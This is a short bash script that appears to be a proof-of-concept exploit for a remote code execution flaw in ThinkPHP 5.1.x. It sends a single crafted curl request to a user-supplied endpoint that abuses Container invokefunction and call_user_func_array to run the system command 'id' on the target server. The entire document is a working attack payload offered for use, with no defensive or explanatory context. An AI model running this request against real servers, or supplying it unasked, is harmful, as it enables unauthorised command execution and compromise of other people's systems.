#!/bin/bash
# ThinkPHP — Container invokeFunction RCE (5.1.x)
# Usage: container_rce.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

curl -s "${ENDPOINT}/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" \
  --max-time 10
